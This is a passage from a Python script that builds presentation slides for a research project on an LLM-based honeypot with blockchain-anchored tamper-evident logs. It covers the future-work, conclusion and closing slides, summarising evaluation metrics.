    ("Batch anchoring on a public chain", "Commit a Merkle root over N records per transaction. Preserves "
     "per-record tamper-evidence while amortising confirmation latency and cost — the natural path from Ganache "
     "to a real deployment.", TEAL),
    ("Learned intent classification", "Replace keyword matching for the obfuscated and encoded payloads that "
     "currently fall into unknown, while keeping the fast path deterministic.", ACCENT),
    ("Controlled live deployment", "Run on an isolated cloud VM with budget caps on the model API and the "
     "dashboard behind access control, to complement the real-payload corpus with organic traffic.", ACCENT),
    ("Human-analyst realism study", "Replace the model judge with expert reviewers to validate the %.2f/5 proxy score."
     % EV["llm_judge_realism"]["mean_score_1to5"], AMBER),
]
y = BODY_TOP + 0.25
for h, s, c in fut:
    rect(sl, M, y, CW, 0.86, fill=WHITE, line=PANEL_LN, radius=0.06)
    rect(sl, M, y, 0.05, 0.86, fill=c, shape=MSO_SHAPE.RECTANGLE)
    text(sl, h, M + 0.3, y + 0.13, 4.2, 0.3, size=13.5, bold=True, color=INK)
    text(sl, s, M + 4.6, y + 0.14, CW - 4.95, 0.65, size=11.5, color=BODY, spacing=1.15)
    y += 0.94

# ============================================================== CONCLUSION
sl = new_slide()
title(sl, "Conclusion", kicker="Wrap-up")
concl = [
    ("A honeypot that stays believable. ", "Model-generated responses scored %.2f/5 by an independent judge, with "
     "up to %.1f%% distinct outputs across %s real attack payloads — the fingerprint that gives static honeypots "
     "away is no longer stable."
     % (EV["llm_judge_realism"]["mean_score_1to5"], dv["sql"]["uniqueness_ratio"] * 100, f"{DS_N:,}")),
    ("Deployable, not just plausible. ", "Tiering keeps routine traffic on a %.1f ms path and reserves the model "
     "for genuinely novel input." % (EV["latency"]["static"]["mean_s"] * 1000)),
    ("Evidence that survives compromise. ", "%d/%d events anchored, %d/%d tamper attempts detected with %d false "
     "positives, at %s gas and %.4f ms to verify."
     % (BC["anchored_success"]["anchored_ok"], BC["anchored_success"]["attempted"],
        BC["tamper_detection"]["detected"], BC["tamper_detection"]["trials"],
        BC["tamper_detection"]["false_positives"],
        f"{int(round(BC['gas']['mean_gas'])):,}", BC["verification_latency_ms"]["mean_ms"])),
    ("Measured, not asserted. ", "Every figure comes from a live run against the real stack, with the weak "
     "results — the api decoy, the withdrawn throughput number, the instant-mining caveat — reported alongside "
     "the strong ones."),
]
bullets(sl, concl, M, BODY_TOP + 0.4, CW - 0.3, size=14, pad=0.34)
rect(sl, M, 6.05, CW, 0.85, fill=NAVY, radius=0.05)
text(sl, "AI deception + multi-service coverage + tamper-evident evidence — combined, measured end to end, "
         "and written up as two IEEE papers.",
     M + 0.35, 6.3, CW - 0.7, 0.4, size=14, bold=True, color=WHITE, align=PP_ALIGN.CENTER)

sl = new_slide()
mark_dark(sl)
rect(sl, -0.1, -0.1, SW + 0.2, SH + 0.2, fill=NAVY, shape=MSO_SHAPE.RECTANGLE)
rect(sl, 0, 0, SW, 0.16, fill=ACCENT, shape=MSO_SHAPE.RECTANGLE)
text(sl, "Thank you", M, 2.6, 11.5, 1.0, size=52, bold=True, color=WHITE)
rect(sl, M, 3.85, 2.2, 0.045, fill=ACCENT, shape=MSO_SHAPE.RECTANGLE)
text(sl, "Questions", M, 4.15, 9.0, 0.5, size=20, color=RGBColor(0x9F, 0xAB, 0xC4))
text(sl, "Code · papers · benchmarks:  CODE/  ·  CODE/paper2/  ·  CODE/paper3/\n"
         "Raw results:  evaluation_results.json  ·  blockchain_results.json",
     M, 5.3, 11.0, 1.0, size=13, color=RGBColor(0x7A, 0x87, 0xA3), spacing=1.4)

# --------------------------------------------------------------------- save
footer_all()
prs.save(OUT)
print("wrote %s  (%d slides)" % (OUT, len(prs.slides._sldIdLst)))
